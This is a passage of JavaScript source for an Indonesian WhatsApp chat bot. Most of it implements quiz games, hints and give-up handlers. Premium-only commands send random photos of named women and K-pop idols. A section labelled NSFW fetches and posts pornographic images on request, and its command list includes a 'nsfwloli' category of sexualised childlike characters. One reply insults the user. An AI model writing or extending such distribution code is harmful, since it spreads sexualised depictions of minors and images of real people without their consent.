							caption: `Gambar diatas adalah bendera negara?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakbendera[m.chat]) {
								waktuHabis(result.name)
								delete tebakbendera[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakkalimat': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakkalimat[m.chat] = [
						await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tebakkalimat[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakkalimat[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebaksiapa': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					siapaaku[m.chat] = [
						await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (siapaaku[m.chat]) {
								waktuHabis(result.jawaban)
								delete siapaaku[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebakkimia': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.unsur)
					tebakkimia[m.chat] = [
						await vreden.sendText(m.chat, `Apa Arti Dari Simbol : *${result.lambang}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tebakkimia[m.chat]) {
								waktuHabis(result.unsur)
								delete tebakkimia[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebaklirik': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebaklirik[m.chat] = [
						await vreden.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tebaklirik[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebaklirik[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tebaktebakan': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebaktebakan[m.chat] = [
						await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tebaktebakan[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebaktebakan[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'susunkata': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					susunkata[m.chat] = [
						await vreden.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (susunkata[m.chat]) {
								waktuHabis(result.jawaban)
								delete susunkata[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'caklontong': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					caklontong[m.chat] = [
						await vreden.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (caklontong[m.chat]) {
								waktuHabis(result.jawaban)
								delete caklontong[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tekateki': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tekateki[m.chat] = [
						await vreden.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tekateki[m.chat]) {
								waktuHabis(result.jawaban)
								delete tekateki[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'kuis':
			case 'quiz':
			case 'kuisioner': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				try {
					let anu = await fetchJson('https://www.vreden.my.id/cdn/game/quiz.json')
					let result = anu.quiz[Math.floor(Math.random() * anu.quiz.length)]
					let teks = `*乂 Quizioner Game*\n\n${result.question}\n\n_pilih A, B, Atau C_`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"[ A ] ${result.choices.A}\",\"id\":\"A\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"[ B ] ${result.choices.B}\",\"id\":\"B\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"[ C ] ${result.choices.C}\",\"id\":\"C\"}`
					}]
					console.log("Jawaban: " + result.correctAnswer)
					kuisioner[m.chat] = [
						vreden.sendButtonText(m.chat, button, teks, footer, m), result, 250,
						setTimeout(() => {
							if (kuisioner[m.chat]) {
								waktuHabis(result.correctAnswer)
								delete kuisioner[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'math':
			case 'mathgame': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				if (usersdb[m.sender].glimit < 1) return m.warning(`Limit game kamu sudah habis`)
				if (!isCreator && !isPremium) {
					usersdb[m.sender].glimit -= 1
				}
				let {
					generateQuestion,
					modes
				} = require('./lib/math')
				if (!text) return m.warning(`*Pilih Modenya Ngabb!*\n- ${Object.keys(modes).join('\n- ')}\n\ncontoh:\n${prefix}math hard`)
				if (!(Object.keys(modes)).includes(args[0])) return m.warning('Pilih mode yang bener GOBLOK!')
				try {
					var {
						soal,
						pilihan_jawaban,
						jawaban_benar,
						waktu,
						hadiah
					} = await generateQuestion(text.toLowerCase())
					let teks = `*乂 Matematika Game*\n\n${soal}\n\n_pilih A, B, Atau C_`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"[ A ] ${pilihan_jawaban[0].jawaban}\",\"id\":\"A\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"[ B ] ${pilihan_jawaban[1].jawaban}\",\"id\":\"B\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"[ C ] ${pilihan_jawaban[2].jawaban}\",\"id\":\"C\"}`
					}]
					console.log("Jawaban: " + jawaban_benar)
					mathgame[m.chat] = [
						vreden.sendButtonText(m.chat, button, teks, footer, m), jawaban_benar, hadiah,
						setTimeout(() => {
							if (mathgame[m.chat]) {
								waktuHabis(jawaban_benar)
								delete mathgame[m.chat]
							}
						}, waktu)
					]
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'bantuan': {
				try {
					if (m.chat in tebakgambar) {
						let json = tebakgambar[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakgame) {
						let json = tebakgame[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakhero) {
						let json = tebakhero[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakff) {
						let json = tebakff[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakkabupaten) {
						let json = tebakkabupaten[m.chat][1]
						m.reply('```' + json.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakjkt48) {
						let json = tebakjkt48[m.chat][1]
						m.reply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakhewan) {
						let json = tebakhewan[m.chat][1]
						m.reply('```' + json.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakml) {
						let json = tebakml[m.chat][1]
						m.reply('```' + json.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakchara) {
						let json = tebakchara[m.chat][1]
						m.reply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebaklogo) {
						let json = tebaklogo[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakaplikasi) {
						let json = tebakaplikasi[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakkata) {
						let json = tebakkata[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in asahotak) {
						let json = asahotak[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in lengkapikalimat) {
						let json = lengkapikalimat[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakbendera) {
						let json = tebakbendera[m.chat][1]
						m.reply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakkalimat) {
						let json = tebakkalimat[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in siapaaku) {
						let json = siapaaku[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakkimia) {
						let json = tebakkimia[m.chat][1]
						m.reply('```' + json.unsur.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebaklirik) {
						let json = tebaklirik[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebaktebakan) {
						let json = tebaktebakan[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in susunkata) {
						let json = susunkata[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in caklontong) {
						let json = caklontong[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tekateki) {
						let json = tekateki[m.chat][1]
						m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'nyerah': {
				try {
					if (m.chat in siapaaku) {
						clearTimeout(siapaaku[m.chat][3])
						delete siapaaku[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakkalimat) {
						clearTimeout(tebakkalimat[m.chat][3])
						delete tebakkalimat[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakbendera) {
						clearTimeout(tebakbendera[m.chat][3])
						delete tebakbendera[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakkata) {
						clearTimeout(tebakkata[m.chat][3])
						delete tebakkata[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in asahotak) {
						clearTimeout(asahotak[m.chat][3])
						delete asahotak[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in lengkapikalimat) {
						clearTimeout(lengkapikalimat[m.chat][3])
						delete lengkapikalimat[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakgame) {
						clearTimeout(tebakgame[m.chat][3])
						delete tebakgame[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakhero) {
						clearTimeout(tebakhero[m.chat][3])
						delete tebakhero[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakff) {
						clearTimeout(tebakff[m.chat][3])
						delete tebakff[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakkabupaten) {
						clearTimeout(tebakkabupaten[m.chat][3])
						delete tebakkabupaten[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakjkt48) {
						clearTimeout(tebakjkt48[m.chat][3])
						delete tebakjkt48[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakhewan) {
						clearTimeout(tebakhewan[m.chat][3])
						delete tebakhewan[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakml) {
						clearTimeout(tebakml[m.chat][3])
						delete tebakml[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakchara) {
						clearTimeout(tebakchara[m.chat][3])
						delete tebakchara[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebaklogo) {
						clearTimeout(tebaklogo[m.chat][3])
						delete tebaklogo[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakaplikasi) {
						clearTimeout(tebakaplikasi[m.chat][3])
						delete tebakaplikasi[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakkimia) {
						clearTimeout(tebakkimia[m.chat][3])
						delete tebakkimia[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebaklirik) {
						clearTimeout(tebaklirik[m.chat][3])
						delete tebaklirik[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebaktebakan) {
						clearTimeout(tebaktebakan[m.chat][3])
						delete tebaktebakan[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in susunkata) {
						clearTimeout(susunkata[m.chat][3])
						delete susunkata[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in caklontong) {
						clearTimeout(caklontong[m.chat][3])
						delete caklontong[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tebakgambar) {
						clearTimeout(tebakgambar[m.chat][3])
						delete tebakgambar[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
					if (m.chat in tekateki) {
						clearTimeout(tekateki[m.chat][3])
						delete tekateki[m.chat]
						let rk = await randomNomor(40)
						usersdb[m.sender].rank -= rk
						return vreden.sendMessage(m.chat, {
							text: `_Lemahhh_😏\n\n*- ${rk} Points Rank*`
						}, {
							quoted: fchannel
						})
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			//▢━━━━━━━━━━━━━━「 ASUPAN COMMAND 」━━━━━━━━━━━━━━▢
			case 'asupan':
			case 'bocil':
			case 'geayubi':
			case 'kayes':
			case 'notnot':
			case 'rikagusriani':
			case 'santuy':
			case 'ukhty': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				try {
					let asup = await fetchJson(`https://www.vreden.my.id/cdn/asupan/${command}.json`)
					const dl_url = await pickRandom(asup)
					await vreden.sendMessage(m.chat, {
						video: {
							url: dl_url
						},
						caption: `🍟 Random ${command}`,
						gifPlayback: false
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'hijaber':
			case 'jeni':
			case 'jiso':
			case 'justina':
			case 'rose':
			case 'ryujin': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				try {
					let asup = await fetchJson(`https://www.vreden.my.id/cdn/asupan/${command}.json`)
					const dl_url = await pickRandom(asup)
					vreden.sendMessage(m.chat, {
						image: {
							url: dl_url
						},
						caption: `🍟 Random ${command}`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'vietnam':
			case 'korea':
			case 'indonesian':
			case 'japan':
			case 'thailand':
			case 'china': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let cecan = await fetchJson(`https://www.vreden.my.id/cdn/cecan/${command}.json`)
					const dl_url = await pickRandom(cecan)
					vreden.sendMessage(m.chat, {
						image: {
							url: dl_url
						},
						caption: `🍟 Cewek ${command}`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			//▢━━━━━━━━━━━━━━「 COGAN COMMAND 」━━━━━━━━━━━━━━▢
			case 'wuyifan':
			case 'suga':
			case 'parkchanyeol':
			case 'ohsehun':
			case 'luhan':
			case 'kimtaehyung':
			case 'kimsoek':
			case 'kimnanjoon':
			case 'kimminseok':
			case 'kimjunmyeon':
			case 'kimjong':
			case 'kimjondae':
			case 'jungkook':
			case 'jimin':
			case 'jhope':
			case 'huangzitao':
			case 'dohkyungsoo':
			case 'baekhyung': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let cogan = await getBuffer(`https://api.zeeoneofc.my.id/api/cogan/${command}?apikey=${setting.BotKey}`)
					await vreden.sendMessage(m.chat, {
						image: cogan,
						caption: 'Nih Kak Cowok Gantengnya 😋'
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break // Fix Qioo
			//▢━━━━━━━━━━━━━━「 NSFW COMMAND 」━━━━━━━━━━━━━━▢
			case 'ahegao':
			case 'ass':
			case 'bdsm':
			case 'blowjob':
			case 'cuckold':
			case 'cum':
			case 'eba':
			case 'ero':
			case 'femdom':
			case 'foot':
			case 'gangbang':
			case 'gifs':
			case 'glasses':
			case 'hentai':
			case 'jahy':
			case 'manga':
			case 'masturbation':
			case 'milf':
			case 'neko':
			case 'neko2':
			case 'nsfwloli':
			case 'orgy':
			case 'panties':
			case 'pussy':
			case 'tentacles':
			case 'thighs':
			case 'yuri':
			case 'zettai': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!chatsdb[m.chat].nsfw) return m.reply("NSFW tidak diaktifkan di grup ini")
				try {
					let nsfw = await fetchJson(`https://www.vreden.my.id/cdn/nsfw/${command}.json`)
					const dl_url = await pickRandom(nsfw)
					vreden.sendMessage(m.chat, {
						image: {
							url: dl_url.url
						},
						caption: `🍟 Nsfw ${command}`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			//▢━━━━━━━━━━━━━━「 FUN COMMAND 」━━━━━━━━━━━━━━▢
			case 'apakah': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
				const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul', 'Kagak tau gw 🗿', 'Kenapa tanya gw?🗿', 'Maleslah mau makan dulu']
				const kah = apa[Math.floor(Math.random() * apa.length)]
				m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
			}
			break
			case 'bisakah': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
				const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
				const ga = bisa[Math.floor(Math.random() * bisa.length)]
				m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
			}
			break
			case 'bagaimanakah': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
				const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
				const ya = gimana[Math.floor(Math.random() * gimana.length)]
				m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
			}
			break
			case 'rate': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
				const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
				const te = ra[Math.floor(Math.random() * ra.length)]
				m.reply(`Rate : ${q}\nJawaban : *${te}%*`)
			}
			break
			case 'gantengcek':
			case 'cekganteng': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
